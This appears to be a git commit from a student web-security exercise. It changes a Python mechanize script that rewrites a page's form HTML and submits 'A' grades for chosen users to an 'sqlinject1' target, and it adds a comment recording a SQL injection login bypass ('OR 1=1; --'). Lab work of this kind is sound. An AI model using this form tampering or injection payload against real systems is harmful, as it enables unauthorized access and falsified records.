5ed7c87989b233c7702f913ba8fcf17cc913fe44
Josh Sklar <jsklar@detroitlabs.com>
2012-11-07 15:53:22 -0500

    Changed sqlinject_1.py to what the spec requires

--- sqlinject_1.py
+++ sqlinject_1.py
@@ -29,12 +29,28 @@ br.select_form(nr=0)
 print "Printing br[project]"
 print br["project"]
 
-br["uniqname"] = "goleary"
+br["uniqname"] = "sklarj"
 br["project"] = ["project1"]
-br["grade"] = "F"
+br["grade"] = "A"
 response3 = br.submit()
 #print br.form
 
+
+html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project1\"> project1 </option> </select>")
+response = mechanize.make_response(
+		    html, [("Content-Type", "text/html")],
+		    "http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/", 200, "OK")
+
+br.set_response(response)
+
+br.select_form(nr=0)
+print "Printing br[project]"
+print br["project"]
+
+br["uniqname"] = "lhejazi"
+br["project"] = ["project1"]
+br["grade"] = "A"
+response3 = br.submit()
 
 
 """
---
+++ sqlinject_2.py
@@ -0,0 +1,1 @@
+#tried mibailey\' OR 1=1; -- and got logged in as the editor
